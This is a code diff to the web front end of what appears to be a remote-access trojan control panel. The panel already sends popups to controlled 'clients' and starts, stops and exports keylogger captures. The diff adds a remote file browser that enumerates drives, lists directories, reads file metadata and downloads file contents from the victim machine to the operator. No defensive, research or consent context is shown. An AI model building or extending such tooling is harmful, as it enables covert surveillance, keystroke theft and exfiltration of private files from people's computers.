@@ -71,6 +71,22 @@ function initializeWebSocket() {
         addLogEntry(`Keylogger ${data.payload.status} for ${data.client_id}`, 'info');
     });
     
+    socket.on('file_list', function(data) {
+        displayFileList(data);
+    });
+    
+    socket.on('file_download', function(data) {
+        handleFileDownload(data);
+    });
+    
+    socket.on('file_info', function(data) {
+        showFileInfo(data);
+    });
+    
+    socket.on('drives_list', function(data) {
+        showDrivesList(data);
+    });
+    
     socket.on('popup_response', function(data) {
         addLogEntry(`Popup response from ${data.client_id}: ${JSON.stringify(data.response)}`, 'info');
     });
@@ -95,6 +111,7 @@ function initializeEventHandlers() {
     document.getElementById('cmd-popup').addEventListener('click', showPopupConfig);
     document.getElementById('cmd-keylog-start').addEventListener('click', sendKeylogStartCommand);
     document.getElementById('cmd-keylog-stop').addEventListener('click', sendKeylogStopCommand);
+    document.getElementById('cmd-file-browser').addEventListener('click', openFileBrowser);
     document.getElementById('cmd-ping').addEventListener('click', sendPingCommand);
     document.getElementById('send-popup').addEventListener('click', sendPopupCommand);
     
@@ -110,6 +127,12 @@ function initializeEventHandlers() {
     // Keylogger controls
     document.getElementById('clear-keylog').addEventListener('click', clearKeylogData);
     document.getElementById('export-keylog').addEventListener('click', exportKeylogData);
+    
+    // File browser controls
+    document.getElementById('refresh-files').addEventListener('click', refreshCurrentDirectory);
+    document.getElementById('get-drives').addEventListener('click', getDrivesList);
+    document.getElementById('go-up').addEventListener('click', goToParentDirectory);
+    document.getElementById('navigate-to-path').addEventListener('click', navigateToPath);
     
     // Refresh clients periodically
     setInterval(refreshClients, 5000);
@@ -240,6 +263,7 @@ function updateCommandButtons() {
     document.getElementById('cmd-popup').disabled = !hasClient;
     document.getElementById('cmd-keylog-start').disabled = !hasClient;
     document.getElementById('cmd-keylog-stop').disabled = !hasClient;
+    document.getElementById('cmd-file-browser').disabled = !hasClient;
     document.getElementById('cmd-ping').disabled = !hasClient;
 }
 
@@ -591,4 +615,334 @@ function exportKeylogData() {
     document.body.removeChild(a);
     
     addLogEntry('Keylog data exported', 'success');
+}
+
+// File Browser functions
+let currentPath = '';
+
+function openFileBrowser() {
+    if (!selectedClient) return;
+    
+    // Request file list for current directory
+    fetch('/api/command/file_list', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            client_id: selectedClient,
+            path: null  // Start with current directory
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error opening file browser: ${error}`, 'error');
+    });
+}
+
+function displayFileList(data) {
+    const container = document.getElementById('file-browser-container');
+    const currentPathInput = document.getElementById('current-path');
+    
+    if (!data.payload.success) {
+        container.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                Error: ${data.payload.error}
+            </div>
+        `;
+        return;
+    }
+    
+    currentPath = data.payload.path;
+    currentPathInput.value = currentPath;
+    
+    let html = '<div class="file-list">';
+    
+    if (data.payload.items.length === 0) {
+        html += '<div class="text-center text-muted py-3">Directory is empty</div>';
+    } else {
+        data.payload.items.forEach(item => {
+            const iconClass = getFileIcon(item.type);
+            const sizeText = item.type === 'directory' ? '' : `(${item.size_formatted})`;
+            
+            html += `
+                <div class="file-item d-flex align-items-center p-2 border-bottom" 
+                     data-path="${escapeHtml(item.path)}" 
+                     data-type="${item.type}">
+                    <i class="${iconClass} me-2"></i>
+                    <div class="flex-grow-1">
+                        <div class="file-name">${escapeHtml(item.name)} ${sizeText}</div>
+                        <small class="text-muted">Modified: ${new Date(item.modified).toLocaleString()}</small>
+                    </div>
+                    <div class="file-actions">
+                        ${item.type === 'directory' ? 
+                            '<button class="btn btn-sm btn-outline-primary open-dir">Open</button>' :
+                            `<button class="btn btn-sm btn-outline-info file-info">Info</button>
+                             ${item.permissions.readable ? '<button class="btn btn-sm btn-outline-success download-file">Download</button>' : ''}`
+                        }
+                    </div>
+                </div>
+            `;
+        });
+    }
+    
+    html += '</div>';
+    container.innerHTML = html;
+    
+    // Add event listeners
+    container.querySelectorAll('.open-dir').forEach(btn => {
+        btn.addEventListener('click', function() {
+            const fileItem = this.closest('.file-item');
+            const path = fileItem.dataset.path;
+            navigateToDirectory(path);
+        });
+    });
+    
+    container.querySelectorAll('.file-info').forEach(btn => {
+        btn.addEventListener('click', function() {
+            const fileItem = this.closest('.file-item');
+            const path = fileItem.dataset.path;
+            getFileInfo(path);
+        });
+    });
+    
+    container.querySelectorAll('.download-file').forEach(btn => {
+        btn.addEventListener('click', function() {
+            const fileItem = this.closest('.file-item');
+            const path = fileItem.dataset.path;
+            downloadFile(path);
+        });
+    });
+    
+    addLogEntry(`Directory loaded: ${data.payload.total_items} items`, 'info');
+}
+
+function getFileIcon(type) {
+    switch(type) {
+        case 'directory': return 'fas fa-folder text-warning';
+        case 'file': return 'fas fa-file text-primary';
+        case 'error': return 'fas fa-exclamation-triangle text-danger';
+        default: return 'fas fa-question text-muted';
+    }
+}
+
+function navigateToDirectory(path) {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/file_list', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            client_id: selectedClient,
+            path: path
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error navigating to directory: ${error}`, 'error');
+    });
+}
+
+function refreshCurrentDirectory() {
+    if (currentPath) {
+        navigateToDirectory(currentPath);
+    } else {
+        openFileBrowser();
+    }
+}
+
+function goToParentDirectory() {
+    // This would be handled by the backend based on current path
+    navigateToDirectory('..');
+}
+
+function navigateToPath() {
+    const pathInput = document.getElementById('current-path');
+    const path = pathInput.value.trim();
+    if (path) {
+        navigateToDirectory(path);
+    }
+}
+
+function getFileInfo(filePath) {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/file_info', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            client_id: selectedClient,
+            file_path: filePath
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error getting file info: ${error}`, 'error');
+    });
+}
+
+function downloadFile(filePath) {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/file_download', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            client_id: selectedClient,
+            file_path: filePath
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error downloading file: ${error}`, 'error');
+    });
+}
+
+function handleFileDownload(data) {
+    if (!data.payload.success) {
+        addLogEntry(`Download failed: ${data.payload.error}`, 'error');
+        return;
+    }
+    
+    // Decode base64 data and create download link
+    const binaryData = atob(data.payload.data);
+    const bytes = new Uint8Array(binaryData.length);
+    for (let i = 0; i < binaryData.length; i++) {
+        bytes[i] = binaryData.charCodeAt(i);
+    }
+    
+    const blob = new Blob([bytes]);
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = data.payload.filename;
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(url);
+    document.body.removeChild(a);
+    
+    addLogEntry(`File downloaded: ${data.payload.filename} (${data.payload.size_formatted})`, 'success');
+}
+
+function showFileInfo(data) {
+    const modal = new bootstrap.Modal(document.getElementById('fileInfoModal'));
+    const content = document.getElementById('file-info-content');
+    const downloadBtn = document.getElementById('download-file-from-info');
+    
+    if (!data.payload.success) {
+        content.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                Error: ${data.payload.error}
+            </div>
+        `;
+        downloadBtn.style.display = 'none';
+    } else {
+        const info = data.payload;
+        content.innerHTML = `
+            <table class="table table-sm">
+                <tr><th>Name:</th><td>${escapeHtml(info.name)}</td></tr>
+                <tr><th>Path:</th><td class="text-break">${escapeHtml(info.path)}</td></tr>
+                <tr><th>Type:</th><td>${info.type}</td></tr>
+                <tr><th>Size:</th><td>${info.size_formatted}</td></tr>
+                <tr><th>Created:</th><td>${new Date(info.created).toLocaleString()}</td></tr>
+                <tr><th>Modified:</th><td>${new Date(info.modified).toLocaleString()}</td></tr>
+                <tr><th>Accessed:</th><td>${new Date(info.accessed).toLocaleString()}</td></tr>
+                <tr><th>Permissions:</th><td>
+                    ${info.permissions.readable ? '<span class="badge bg-success">R</span>' : '<span class="badge bg-secondary">R</span>'}
+                    ${info.permissions.writable ? '<span class="badge bg-warning">W</span>' : '<span class="badge bg-secondary">W</span>'}
+                    ${info.permissions.executable ? '<span class="badge bg-info">X</span>' : '<span class="badge bg-secondary">X</span>'}
+                </td></tr>
+            </table>
+        `;
+        
+        if (info.is_downloadable) {
+            downloadBtn.style.display = 'inline-block';
+            downloadBtn.onclick = () => {
+                modal.hide();
+                downloadFile(info.path);
+            };
+        } else {
+            downloadBtn.style.display = 'none';
+        }
+    }
+    
+    modal.show();
+}
+
+function getDrivesList() {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/get_drives', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client_id: selectedClient })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error getting drives list: ${error}`, 'error');
+    });
+}
+
+function showDrivesList(data) {
+    const modal = new bootstrap.Modal(document.getElementById('drivesModal'));
+    const content = document.getElementById('drives-list');
+    
+    if (!data.payload.success) {
+        content.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                Error: ${data.payload.error}
+            </div>
+        `;
+    } else {
+        let html = '<div class="list-group">';
+        
+        data.payload.drives.forEach(drive => {
+            const accessible = drive.accessible ? 'list-group-item-success' : 'list-group-item-secondary';
+            html += `
+                <a href="#" class="list-group-item list-group-item-action ${accessible} drive-item" 
+                   data-path="${escapeHtml(drive.path)}"
+                   ${drive.accessible ? '' : 'style="opacity: 0.6;"'}>
+                    <div class="d-flex w-100 justify-content-between align-items-center">
+                        <h6 class="mb-1">
+                            <i class="fas fa-hard-drive me-2"></i>
+                            Drive ${drive.letter}
+                        </h6>
+                        <small>${drive.accessible ? 'Accessible' : 'Inaccessible'}</small>
+                    </div>
+                    <p class="mb-1">${escapeHtml(drive.path)}</p>
+                </a>
+            `;
+        });
+        
+        html += '</div>';
+        content.innerHTML = html;
+        
+        // Add click handlers
+        content.querySelectorAll('.drive-item').forEach(item => {
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                const path = this.dataset.path;
+                modal.hide();
+                navigateToDirectory(path);
+            });
+        });
+    }
+    
+    modal.show();
 } 
